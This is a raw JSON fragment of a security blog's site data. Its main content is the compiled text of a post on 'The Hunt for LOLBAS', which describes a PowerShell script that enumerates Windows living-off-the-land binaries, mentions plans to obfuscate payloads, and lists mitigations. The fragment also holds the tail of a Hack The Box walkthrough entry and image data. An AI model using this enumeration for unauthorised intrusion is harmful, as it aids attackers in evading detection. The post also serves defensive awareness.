|\\n     | ___ | .__ | https://hackthebox.store/password |\\n   \\n                      PS: Use root flag as password!\\n\")));\n}\n;\nMDXContent.isMDXComponent = true;","hero":{"full":{"base64":"data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAAMABQDASIAAhEBAxEB/8QAFgABAQEAAAAAAAAAAAAAAAAAAAMC/8QAFQEBAQAAAAAAAAAAAAAAAAAAAQL/2gAMAwEAAhADEAAAAcJmrIB//8QAHBAAAgICAwAAAAAAAAAAAAAAAAECEgMRExQx/9oACAEBAAEFAtYSPWbhxJVKJHh//8QAFREBAQAAAAAAAAAAAAAAAAAAACH/2gAIAQMBAT8BR//EABQRAQAAAAAAAAAAAAAAAAAAABD/2gAIAQIBAT8BP//EABoQAAIDAQEAAAAAAAAAAAAAAAERAAISIDH/2gAIAQEABj8Csbay/BENuI1Ni+P/xAAaEAEAAwEBAQAAAAAAAAAAAAABABExIUGx/9oACAEBAAE/ISys4GhOAFNFsuRBWyid97ksCbsrB8n/2gAMAwEAAgADAAAAEBDv/8QAFhEBAQEAAAAAAAAAAAAAAAAAACEB/9oACAEDAQE/EGRX/8QAFREBAQAAAAAAAAAAAAAAAAAAEBH/2gAIAQIBAT8Qh//EABwQAQACAgMBAAAAAAAAAAAAAAEAESExYXGR0f/aAAgBAQABPxBuDNjJXeoT2c9pwsZyoFac9wWNFYpl85gYqCBow+QN6QW9Pk//2Q==","aspectRatio":1.659643435980551,"src":"/static/3a3ddea7cc206a68af35140e2b2fa47a/58fe7/SwagShop_Hack_The_Box_Walkthrough.jpg","srcSet":"/static/3a3ddea7cc206a68af35140e2b2fa47a/e0f30/SwagShop_Hack_The_Box_Walkthrough.jpg 236w,\n/static/3a3ddea7cc206a68af35140e2b2fa47a/86afd/SwagShop_Hack_The_Box_Walkthrough.jpg 472w,\n/static/3a3ddea7cc206a68af35140e2b2fa47a/58fe7/SwagShop_Hack_The_Box_Walkthrough.jpg 944w,\n/static/3a3ddea7cc206a68af35140e2b2fa47a/02748/SwagShop_Hack_The_Box_Walkthrough.jpg 1416w,\n/static/3a3ddea7cc206a68af35140e2b2fa47a/5c241/SwagShop_Hack_The_Box_Walkthrough.jpg 1888w,\n/static/3a3ddea7cc206a68af35140e2b2fa47a/5dbbf/SwagShop_Hack_The_Box_Walkthrough.jpg 2048w","srcWebp":"/static/3a3ddea7cc206a68af35140e2b2fa47a/99fbb/SwagShop_Hack_The_Box_Walkthrough.webp","srcSetWebp":"/static/3a3ddea7cc206a68af35140e2b2fa47a/77392/SwagShop_Hack_The_Box_Walkthrough.webp 236w,\n/static/3a3ddea7cc206a68af35140e2b2fa47a/1f177/SwagShop_Hack_The_Box_Walkthrough.webp 472w,\n/static/3a3ddea7cc206a68af35140e2b2fa47a/99fbb/SwagShop_Hack_The_Box_Walkthrough.webp 944w,\n/static/3a3ddea7cc206a68af35140e2b2fa47a/4a492/SwagShop_Hack_The_Box_Walkthrough.webp 1416w,\n/static/3a3ddea7cc206a68af35140e2b2fa47a/b0b8f/SwagShop_Hack_The_Box_Walkthrough.webp 1888w,\n/static/3a3ddea7cc206a68af35140e2b2fa47a/ceab5/SwagShop_Hack_The_Box_Walkthrough.webp 2048w","sizes":"(max-width: 944px) 100vw, 944px"},"regular":{"base64":"data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAAMABQDASIAAhEBAxEB/8QAFgABAQEAAAAAAAAAAAAAAAAAAAMC/8QAFQEBAQAAAAAAAAAAAAAAAAAAAQL/2gAMAwEAAhADEAAAAcJmrIB//8QAHBAAAgICAwAAAAAAAAAAAAAAAAECEgMRExQx/9oACAEBAAEFAtYSPWbhxJVKJHh//8QAFREBAQAAAAAAAAAAAAAAAAAAACH/2gAIAQMBAT8BR//EABQRAQAAAAAAAAAAAAAAAAAAABD/2gAIAQIBAT8BP//EABoQAAIDAQEAAAAAAAAAAAAAAAERAAISIDH/2gAIAQEABj8Csbay/BENuI1Ni+P/xAAaEAEAAwEBAQAAAAAAAAAAAAABABExIUGx/9oACAEBAAE/ISys4GhOAFNFsuRBWyid97ksCbsrB8n/2gAMAwEAAgADAAAAEBDv/8QAFhEBAQEAAAAAAAAAAAAAAAAAACEB/9oACAEDAQE/EGRX/8QAFREBAQAAAAAAAAAAAAAAAAAAEBH/2gAIAQIBAT8Qh//EABwQAQACAgMBAAAAAAAAAAAAAAEAESExYXGR0f/aAAgBAQABPxBuDNjJXeoT2c9pwsZyoFac9wWNFYpl85gYqCBow+QN6QW9Pk//2Q==","aspectRatio":1.659643435980551,"src":"/static/3a3ddea7cc206a68af35140e2b2fa47a/1dc0b/SwagShop_Hack_The_Box_Walkthrough.jpg","srcSet":"/static/3a3ddea7cc206a68af35140e2b2fa47a/3a5ce/SwagShop_Hack_The_Box_Walkthrough.jpg 163w,\n/static/3a3ddea7cc206a68af35140e2b2fa47a/05730/SwagShop_Hack_The_Box_Walkthrough.jpg 327w,\n/static/3a3ddea7cc206a68af35140e2b2fa47a/1dc0b/SwagShop_Hack_The_Box_Walkthrough.jpg 653w,\n/static/3a3ddea7cc206a68af35140e2b2fa47a/f72c7/SwagShop_Hack_The_Box_Walkthrough.jpg 980w,\n/static/3a3ddea7cc206a68af35140e2b2fa47a/6e4a3/SwagShop_Hack_The_Box_Walkthrough.jpg 1306w,\n/static/3a3ddea7cc206a68af35140e2b2fa47a/5dbbf/SwagShop_Hack_The_Box_Walkthrough.jpg 2048w","srcWebp":"/static/3a3ddea7cc206a68af35140e2b2fa47a/0acdf/SwagShop_Hack_The_Box_Walkthrough.webp","srcSetWebp":"/static/3a3ddea7cc206a68af35140e2b2fa47a/ac59e/SwagShop_Hack_The_Box_Walkthrough.webp 163w,\n/static/3a3ddea7cc206a68af35140e2b2fa47a/7660b/SwagShop_Hack_The_Box_Walkthrough.webp 327w,\n/static/3a3ddea7cc206a68af35140e2b2fa47a/0acdf/SwagShop_Hack_The_Box_Walkthrough.webp 653w,\n/static/3a3ddea7cc206a68af35140e2b2fa47a/75470/SwagShop_Hack_The_Box_Walkthrough.webp 980w,\n/static/3a3ddea7cc206a68af35140e2b2fa47a/68d47/SwagShop_Hack_The_Box_Walkthrough.webp 1306w,\n/static/3a3ddea7cc206a68af35140e2b2fa47a/ceab5/SwagShop_Hack_The_Box_Walkthrough.webp 2048w","sizes":"(max-width: 653px) 100vw, 653px"},"narrow":{"base64":"data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAAMABQDASIAAhEBAxEB/8QAFgABAQEAAAAAAAAAAAAAAAAAAAMC/8QAFQEBAQAAAAAAAAAAAAAAAAAAAQL/2gAMAwEAAhADEAAAAcJmrIB//8QAHBAAAgICAwAAAAAAAAAAAAAAAAECEgMRExQx/9oACAEBAAEFAtYSPWbhxJVKJHh//8QAFREBAQAAAAAAAAAAAAAAAAAAACH/2gAIAQMBAT8BR//EABQRAQAAAAAAAAAAAAAAAAAAABD/2gAIAQIBAT8BP//EABoQAAIDAQEAAAAAAAAAAAAAAAERAAISIDH/2gAIAQEABj8Csbay/BENuI1Ni+P/xAAaEAEAAwEBAQAAAAAAAAAAAAABABExIUGx/9oACAEBAAE/ISys4GhOAFNFsuRBWyid97ksCbsrB8n/2gAMAwEAAgADAAAAEBDv/8QAFhEBAQEAAAAAAAAAAAAAAAAAACEB/9oACAEDAQE/EGRX/8QAFREBAQAAAAAAAAAAAAAAAAAAEBH/2gAIAQIBAT8Qh//EABwQAQACAgMBAAAAAAAAAAAAAAEAESExYXGR0f/aAAgBAQABPxBuDNjJXeoT2c9pwsZyoFac9wWNFYpl85gYqCBow+QN6QW9Pk//2Q==","aspectRatio":1.659643435980551,"src":"/static/3a3ddea7cc206a68af35140e2b2fa47a/eaa58/SwagShop_Hack_The_Box_Walkthrough.jpg","srcSet":"/static/3a3ddea7cc206a68af35140e2b2fa47a/5a3ee/SwagShop_Hack_The_Box_Walkthrough.jpg 114w,\n/static/3a3ddea7cc206a68af35140e2b2fa47a/41f8f/SwagShop_Hack_The_Box_Walkthrough.jpg 229w,\n/static/3a3ddea7cc206a68af35140e2b2fa47a/eaa58/SwagShop_Hack_The_Box_Walkthrough.jpg 457w,\n/static/3a3ddea7cc206a68af35140e2b2fa47a/c309b/SwagShop_Hack_The_Box_Walkthrough.jpg 686w,\n/static/3a3ddea7cc206a68af35140e2b2fa47a/e3008/SwagShop_Hack_The_Box_Walkthrough.jpg 914w,\n/static/3a3ddea7cc206a68af35140e2b2fa47a/5dbbf/SwagShop_Hack_The_Box_Walkthrough.jpg 2048w","srcWebp":"/static/3a3ddea7cc206a68af35140e2b2fa47a/15384/SwagShop_Hack_The_Box_Walkthrough.webp","srcSetWebp":"/static/3a3ddea7cc206a68af35140e2b2fa47a/31fce/SwagShop_Hack_The_Box_Walkthrough.webp 114w,\n/static/3a3ddea7cc206a68af35140e2b2fa47a/e3e25/SwagShop_Hack_The_Box_Walkthrough.webp 229w,\n/static/3a3ddea7cc206a68af35140e2b2fa47a/15384/SwagShop_Hack_The_Box_Walkthrough.webp 457w,\n/static/3a3ddea7cc206a68af35140e2b2fa47a/0258d/SwagShop_Hack_The_Box_Walkthrough.webp 686w,\n/static/3a3ddea7cc206a68af35140e2b2fa47a/64ea2/SwagShop_Hack_The_Box_Walkthrough.webp 914w,\n/static/3a3ddea7cc206a68af35140e2b2fa47a/ceab5/SwagShop_Hack_The_Box_Walkthrough.webp 2048w","sizes":"(max-width: 457px) 100vw, 457px"},"seo":{"src":"/static/3a3ddea7cc206a68af35140e2b2fa47a/0ff54/SwagShop_Hack_The_Box_Walkthrough.jpg"}}},{"id":"32c98cab-0f66-51d2-9c73-c188b1e2bd8d","slug":"/The-Hunt-for-LOLBAS","secret":false,"title":"The Hunt for LOLBAS","author":"NotoriousRebel","date":"July 13th, 2019","dateForSEO":"2019-07-13T00:00:00.000Z","timeToRead":2,"excerpt":"Using Powershell to Hunt for LOLBAS","subscription":true,"body":"function _extends() { _extends = Object.assign || function (target) { for (var i = 1; i < arguments.length; i++) { var source = arguments[i]; for (var key in source) { if (Object.prototype.hasOwnProperty.call(source, key)) { target[key] = source[key]; } } } return target; }; return _extends.apply(this, arguments); }\n\nfunction _objectWithoutProperties(source, excluded) { if (source == null) return {}; var target = _objectWithoutPropertiesLoose(source, excluded); var key, i; if (Object.getOwnPropertySymbols) { var sourceSymbolKeys = Object.getOwnPropertySymbols(source); for (i = 0; i < sourceSymbolKeys.length; i++) { key = sourceSymbolKeys[i]; if (excluded.indexOf(key) >= 0) continue; if (!Object.prototype.propertyIsEnumerable.call(source, key)) continue; target[key] = source[key]; } } return target; }\n\nfunction _objectWithoutPropertiesLoose(source, excluded) { if (source == null) return {}; var target = {}; var sourceKeys = Object.keys(source); var key, i; for (i = 0; i < sourceKeys.length; i++) { key = sourceKeys[i]; if (excluded.indexOf(key) >= 0) continue; target[key] = source[key]; } return target; }\n\n/* @jsx mdx */\nvar _frontmatter = {\n  \"title\": \"The Hunt for LOLBAS\",\n  \"author\": \"NotoriousRebel\",\n  \"date\": \"2019-07-13T00:00:00.000Z\",\n  \"hero\": \"./images/hunt_lolbas_logo.png\",\n  \"excerpt\": \"Using Powershell to Hunt for LOLBAS\"\n};\n\nvar makeShortcode = function makeShortcode(name) {\n  return function MDXDefaultShortcode(props) {\n    console.warn(\"Component \" + name + \" was not imported, exported, or provided by MDXProvider as global scope\");\n    return mdx(\"div\", props);\n  };\n};\n\nvar layoutProps = {\n  _frontmatter: _frontmatter\n};\nvar MDXLayout = \"wrapper\";\nreturn function MDXContent(_ref) {\n  var components = _ref.components,\n      props = _objectWithoutProperties(_ref, [\"components\"]);\n\n  return mdx(MDXLayout, _extends({}, layoutProps, props, {\n    components: components,\n    mdxType: \"MDXLayout\"\n  }), mdx(\"h1\", {\n    \"id\": \"hunting-for-lolbas\"\n  }, \"Hunting for LOLBAS\"), mdx(\"h3\", {\n    \"id\": \"introduction\"\n  }, \"Introduction\"), mdx(\"p\", null, \"Like many pentesters I am a big fan of the \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://github.com/LOLBAS-Project/LOLBAS\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"LOLBAS\"), \" project.\\nand even recently contributed to \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://github.com/LOLBAS-Project/LOLBAS/pull/40\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"it\"), \". Although, the project is\\nincredibly useful I couldn\\u2019t find a tool that automated the process\\nof finding them so I decided to make one.\\nThen again how useful are they for redteamers? The answer is incredibly useful.\\nA recent attack dubbed \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://www.microsoft.com/security/blog/2019/07/08/dismantling-a-fileless-campaign-microsoft-defender-atp-next-gen-protection-exposes-astaroth-attack/\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"Astaroth\"), \" utilized LOLBAS for every step of the attack\\nafter initial compromise. \"), mdx(\"p\", null, \"With a goal in mind, I turned to Powershell.\"), mdx(\"h3\", {\n    \"id\": \"understanding-lolbas\"\n  }, \"Understanding LOLBAS\"), mdx(\"p\", null, \"Before automating the hunt for LOLBAS it\\u2019s important to understand\\nwhat they are. LOLBAS stands for living off the land binaries and scripts,\\na simple example, as leveraged in my last post is regsvr32. A seemingly\\ninconspicuous executable being used for code execution. Binaries and scripts\\nthat can be used in creative ways that benefit blueteam and redteam. Blueteam\\nas it can show possible attack vectors that should be monitored and understood.\\nRedteam as utilizing these possible attack vectors if present, may be less likely\\nnoticed and being run by a trusted source.\"), mdx(\"h3\", {\n    \"id\": \"python---powershell\"\n  }, \"Python -> Powershell\"), mdx(\"p\", null, \"With Linux being taken care of by \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://gtfobins.github.io/\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"GTFOBins\"), \"\\nWindows was next.\\nOne of the biggest obstacles is that compared to GTFOBins,\\nLOLBAS is over quadruple the size. Using Python and Bash to quickly\\naccumulate the files and output the information into an easy way\\nto copy and paste is great. \"), mdx(\"p\", null, mdx(\"span\", _extends({\n    parentName: \"p\"\n  }, {\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"871px\"\n    }\n  }), \"\\n      \", mdx(\"span\", _extends({\n    parentName: \"span\"\n  }, {\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"102.18140068886336%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAACXBIWXMAABJ0AAASdAHeZh94AAACLklEQVQ4y51U27KcIBAEFAQRUVBX18u6l1TykPz/53VG91ySVJ3K8Tx0MVDaMN0zw5qWIUaPy2XF7X7HOq1w2kHnGkIIMMaOwftnUFUe09zj+/oN1+GGNrSQaXqcsKqfgTE52lbC1wpOeViRHyfbUJYMSaLhnEZuGaxVyIxGIhIoSbHKwBnfkSYpMp3BZGaPZSp3WaSUMNogkxnYqWdQKkXlDVyaEUrUrkbIa9R1CVc4CCZ2KKVQOAdf+P3nV2JjDKqyQmEKsJZMKb3FeO7RSY/WNlBcEcH2oi+kXL9oqDKGrm8RYsBlvZCeHd1a07k6RhjC+6b0Fcahx0KkXekRQiB9k2OEW8p7wJ9rmjI0MUUXI0xhdrEDCyhF+fbNp1J+hRAc57HG/XFDp0/IhXlz+VBh85fbrS2wLCuapiGTerSshZb6QGFX/75QIBLZOI6YhhPGeYT3fu8aQXpu9cmPEHLOofVW6A49Ob25ba3dsREHFyAT+TFh0/x9sFX/OE6Ypgnr7YorIbekY0Iaik+k/Eq4ubvpKE2Gx487hr7HXM5Y44o5LrgGWt0MyywiiyhYASnkx4R5znC6UrfMC+ZhxMlRx7CMoKCZRkaxZHJvwfRl/U/KHOudRld/x8/yFx7uga7osHQLhuoMkxgI/on52LXvm35wNBNr9OeBnI40dehVSh7rlJ6mTVXn5F6FKB2iLiklmiBkjlT8a8Mhpbm3tdp9ueJ8mvZ2438U+xH8Bn1grZxfIP4rAAAAAElFTkSuQmCC')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  })), \"\\n  \", mdx(\"picture\", {\n    parentName: \"span\"\n  }, \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/cbef4edc206c107701526fd4c63ef865/e9904/automate.webp 871w\"],\n    \"sizes\": \"(max-width: 871px) 100vw, 871px\",\n    \"type\": \"image/webp\"\n  })), \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/cbef4edc206c107701526fd4c63ef865/62d82/automate.png 871w\"],\n    \"sizes\": \"(max-width: 871px) 100vw, 871px\",\n    \"type\": \"image/png\"\n  })), \"\\n        \", mdx(\"img\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"className\": \"gatsby-resp-image-image\",\n    \"src\": \"/static/cbef4edc206c107701526fd4c63ef865/62d82/automate.png\",\n    \"alt\": \"Automate\",\n    \"title\": \"Automate\",\n    \"loading\": \"lazy\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    }\n  })), \"\\n      \"), \"\\n    \")), mdx(\"h5\", {\n    \"id\": \"automating-the-extraction-of-important-information-from-each-file\"\n  }, \"Automating the extraction of important information from each file\"), mdx(\"h3\", {\n    \"id\": \"checking-the-paths-in-powershell\"\n  }, \"Checking the Paths in Powershell\"), mdx(\"p\", null, \"Organizing the information in Powershell was simple,\\nusing a hash table. The key being the filepath mapped to\\nan array of the Binary or Script name and an example command\\nutilizing it. For example:\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-powershell\"\n  }), \"'C:\\\\Windows\\\\explorer.exe' = 'Explorer.exe', 'explorer.exe calc.exe';\\n\")), mdx(\"p\", null, \"Path on the left, mapped to the name of the Binary or Script\\nand an example command utilizing it. \"), mdx(\"p\", null, \"After creating the hash table the rest is a piece of cake.\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-powershell\"\n  }), \"foreach($path in $dict.Keys){\\n   Try\\n    {         \\n      if(Test-Path -Path $path){\\n         $paths += $path\\n      }\\n    }\\n    Catch {\\n      Write-Host \\\"An error occurred:\\\"\\n      Write-Host $_\\n    }\\n }\\n\")), mdx(\"p\", null, \" Just iterate through the keys in the hash table and check\\nif the path exists if it does add it to an array. Then at the\\nend iterate through the array and pretty print it.\\nTbe script\\u2019s name was an obvious choice:\\n\", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://github.com/NotoriousRebel/Find-LOLBAS\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"Find-LOLBAS\"), \".\"), mdx(\"h3\", {\n    \"id\": \"whats-next\"\n  }, \"What\\u2019s Next?\"), mdx(\"ul\", null, mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, \"Staying up to date with new LOLBAS additions\")), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, \"Adding different ways to run the script such as through C# in Powershell\")), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, \"Look into obfuscating payload with Crypt32.dll\"))), mdx(\"h3\", {\n    \"id\": \"mitigation\"\n  }, \"Mitigation\"), mdx(\"ul\", null, mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, \"Adhering to proper block rules such as\\n\", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"Microsoft recommended block rules\"), \"\\nand utilizing things such as Applocker and Software Restriction Policies \")), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, \"Being cognisant of normal network traffic in and out of your system/s is also crucial\\nas becoming familiar with daily traffic can make it very easy to spot when something is\\nout of the ordinary\")), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, \"Understanding the foundation of each LOLBAS is also important,\\nknowing how each one is meant to be used will make it easier to spot when it is\\nused for malicious purposes. \"))), mdx(\"p\", null, \"Overall awareness is necessary as well, knowing how a LOLBAS should be used\\nis key. For example, if you\\u2019ve never used regsvr32 before and find it calling out to the internet\\nthat should set off an alarm! \"), mdx(\"h3\", {\n    \"id\": \"acknowledgements\"\n  }, \"Acknowledgements\"), mdx(\"p\", null, \"This script wouldn\\u2019t have been possible without the amazing people\\nwho work on \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://github.com/LOLBAS-Project/LOLBAS\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"LOLBAS\"), \".\"), mdx(\"p\", null, \"Special thanks to \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://twitter.com/bohops\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"@Bohops\"), \"\\nfor inspiration and \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://twitter.com/Oddvarmoe\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"@Oddvarmoe\"), \"\\nfor the consistent work and maintenance on the\\n\", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://github.com/LOLBAS-Project/LOLBAS\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"LOLBAS\"), \" project.\"));\n}\n;\nMDXContent.isMDXComponent = true;","hero":{"full":{"base64":"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAACXBIWXMAAAsSAAALEgHS3X78AAADcElEQVQ4y41Ua0xURxQeaVqTNrFN2hhNTGr40VRaAsHYH9b6iCGFJU1DIaRJHxqDMeIjkkIfUB7amlat/UGgTVotDWBsQkt84CO4VndBZHmn5aFV1gZBVpBl2S4scmfm65m798KAJDrJl3Pu3HO+e+bOOR8DwNSSUjLyn9L8ZMJP5P9F1k8IEHoJlYR0wjMqlmyUzqGTLbICNhFa8PjVQ3jPypnJtx+iLH+flsAJBkEQpAVh7XEt7jCzllmpfUyye7Ugg6qWGtFC4BrxEYsjUiXnfINZEucKQlkhhJmoeCPckRV5jGyQEQRu+e8zrVSPXZmdp6CIreAZUmUNYUJa1gwi2zc5zZ9VZIlqo+rXcpGRkSGTHCmy+Mt86fMNmQRUaYTQtI9cjJxXyBbGhSjJyd6HF2MSjPTC72RO+R8yPu1jxMbH40Zv77x0gWCY42KPH9UdIzjXNap8Wds1anjuCYyHjRqWl/tJ0ysbk3DVN8Gb2zvoHNOYoty3swuR4kg2eUKhEPxj46Z/stUHtseNz894wXa7wHZckSzzT77yq07cDz7sZq/GvDZw4GQtHtD3v7kZkqXHytHTVI+2gIEVcW+gzXMdBUWFyNpDTfDwPxRf6AfLvIzPTnvxQ/0gXvi0EWyXS6Yev6G+N8yWvhw9VHWtEz3DAflLu1ee6Avgd7cHPvory9ash9tZh7yCAuzMykJwfAzv/twLttWJl764jtb+INZ+3wm27bI8eGlQEY6w1XGxLRlFRzFN/7/+Yq084u7GBL053tCJ6NfjEAyMITQxiYB/1Ozq5fmNcPz4N1y3Asg/ewcJh9slVSictycVYTc7UVlRtvrNt5BTdda4S8eua2qVJZc8iEtOxcH9RZGREZHLvPKPH4uzG0yiVV+3ILumD7mnvHJJ7jXDN2WGnFJtk9TgdiEpJYWvS/9QJmbulesd7+DooW9nZ5AL0w4EpvBb2zDKm3yo8BCaffJY4xDULVuh2+3GblFNdtVZZzgvnEf/v3fk7GTIOXaBHrTH7y71+vMmYTgc3qwFCauh5XyyBaZEWcN6t8WWLlNpiCDPmmdyhaGRLCQMuhqpVTYjDrqWkc3XFUeTKmGBa/v2Kp0jX5om2r6D0PUEAuslfGCT0UEWzWGdJ7RPE9IsuVfq3U9QndtOqCZ8RHjOPqbO8T+4HPK2YHw2SwAAAABJRU5ErkJggg==","aspectRatio":1,"src":"/static/e6f5e62a79cd7704687fe00638df8551/e0259/hunt_lolbas_logo.png","srcSet":"/static/e6f5e62a79cd7704687fe00638df8551/5b37e/hunt_lolbas_logo.png 236w,\n/static/e6f5e62a79cd7704687fe00638df8551/49058/hunt_lolbas_logo.png 472w,\n/static/e6f5e62a79cd7704687fe00638df8551/e0259/hunt_lolbas_logo.png 749w","srcWebp":"/static/e6f5e62a79cd7704687fe00638df8551/d8dc1/hunt_lolbas_logo.webp","srcSetWebp":"/static/e6f5e62a79cd7704687fe00638df8551/77392/hunt_lolbas_logo.webp 236w,\n/static/e6f5e62a79cd7704687fe00638df8551/1f177/hunt_lolbas_logo.webp 472w,\n/static/e6f5e62a79cd7704687fe00638df8551/d8dc1/hunt_lolbas_logo.webp 749w","sizes":"(max-width: 749px) 100vw, 749px"},"regular":{"base64":"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAACXBIWXMAAAsSAAALEgHS3X78AAADcElEQVQ4y41Ua0xURxQeaVqTNrFN2hhNTGr40VRaAsHYH9b6iCGFJU1DIaRJHxqDMeIjkkIfUB7amlat/UGgTVotDWBsQkt84CO4VndBZHmn5aFV1gZBVpBl2S4scmfm65m798KAJDrJl3Pu3HO+e+bOOR8DwNSSUjLyn9L8ZMJP5P9F1k8IEHoJlYR0wjMqlmyUzqGTLbICNhFa8PjVQ3jPypnJtx+iLH+flsAJBkEQpAVh7XEt7jCzllmpfUyye7Ugg6qWGtFC4BrxEYsjUiXnfINZEucKQlkhhJmoeCPckRV5jGyQEQRu+e8zrVSPXZmdp6CIreAZUmUNYUJa1gwi2zc5zZ9VZIlqo+rXcpGRkSGTHCmy+Mt86fMNmQRUaYTQtI9cjJxXyBbGhSjJyd6HF2MSjPTC72RO+R8yPu1jxMbH40Zv77x0gWCY42KPH9UdIzjXNap8Wds1anjuCYyHjRqWl/tJ0ysbk3DVN8Gb2zvoHNOYoty3swuR4kg2eUKhEPxj46Z/stUHtseNz894wXa7wHZckSzzT77yq07cDz7sZq/GvDZw4GQtHtD3v7kZkqXHytHTVI+2gIEVcW+gzXMdBUWFyNpDTfDwPxRf6AfLvIzPTnvxQ/0gXvi0EWyXS6Yev6G+N8yWvhw9VHWtEz3DAflLu1ee6Avgd7cHPvory9ash9tZh7yCAuzMykJwfAzv/twLttWJl764jtb+INZ+3wm27bI8eGlQEY6w1XGxLRlFRzFN/7/+Yq084u7GBL053tCJ6NfjEAyMITQxiYB/1Ozq5fmNcPz4N1y3Asg/ewcJh9slVSictycVYTc7UVlRtvrNt5BTdda4S8eua2qVJZc8iEtOxcH9RZGREZHLvPKPH4uzG0yiVV+3ILumD7mnvHJJ7jXDN2WGnFJtk9TgdiEpJYWvS/9QJmbulesd7+DooW9nZ5AL0w4EpvBb2zDKm3yo8BCaffJY4xDULVuh2+3GblFNdtVZZzgvnEf/v3fk7GTIOXaBHrTH7y71+vMmYTgc3qwFCauh5XyyBaZEWcN6t8WWLlNpiCDPmmdyhaGRLCQMuhqpVTYjDrqWkc3XFUeTKmGBa/v2Kp0jX5om2r6D0PUEAuslfGCT0UEWzWGdJ7RPE9IsuVfq3U9QndtOqCZ8RHjOPqbO8T+4HPK2YHw2SwAAAABJRU5ErkJggg==","aspectRatio":1,"src":"/static/e6f5e62a79cd7704687fe00638df8551/3ddd4/hunt_lolbas_logo.png","srcSet":"/static/e6f5e62a79cd7704687fe00638df8551/078a8/hunt_lolbas_logo.png 163w,\n/static/e6f5e62a79cd7704687fe00638df8551/e56da/hunt_lolbas_logo.png 327w,\n/static/e6f5e62a79cd7704687fe00638df8551/3ddd4/hunt_lolbas_logo.png 653w,\n/static/e6f5e62a79cd7704687fe00638df8551/e0259/hunt_lolbas_logo.png 